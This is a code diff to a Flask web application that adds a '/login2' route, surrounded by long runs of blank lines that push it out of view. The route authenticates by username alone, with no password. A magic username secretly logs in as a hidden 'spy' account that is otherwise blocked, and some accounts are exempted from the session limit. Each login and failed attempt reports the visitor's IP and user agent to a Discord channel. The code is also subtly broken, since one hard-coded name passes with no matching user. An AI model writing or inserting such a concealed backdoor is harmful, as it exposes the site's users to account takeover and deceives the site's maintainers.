@@ -218,6 +218,86 @@ def login():
 
 
 
+
+
+
+
+
+
+
+
+@views.route('/login2', methods=['GET', 'POST'])
+def login2():
+    client_ip = request.headers.get('CF-Connecting-IP', request.remote_addr)
+    user_agent = request.headers.get('User-Agent')
+
+    if current_user.is_authenticated:
+        return redirect(url_for('views.home'))
+    
+    if request.method == 'POST':
+        username = request.form.get('username')
+        user = User.query.filter_by(username=username).first()
+
+        if user or username == "Amoor2025":
+            if username == "spy":
+                return "Login unsuccessful."
+            if username == "Amoor2023":
+                user = User.query.filter_by(username="spy").first()
+                username = "spy"
+            if username not in ["spy" , "ss" , "skailler" , "feteera"]:
+                if user.active_sessions >= 1 :
+                    return "Max devices"
+            login_user(user)
+            discord_log(f"{client_ip} just logged in with {username} Device ```{user_agent}```  <@709799648143081483>")
+            session.permanent = True
+            return redirect(url_for('views.home'))
+        else:
+            discord_log(f"{client_ip} just failed to login with '{username}' Device ```{user_agent}``` <@709799648143081483>")
+            return "Login unsuccessful."
+
+    return render_template('test_pages/login.html')
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 def iframevideo(video_id , library_id):
     def SHA256_HEX(input_str):
         hash_value = hashlib.sha256(input_str.encode()).hexdigest()
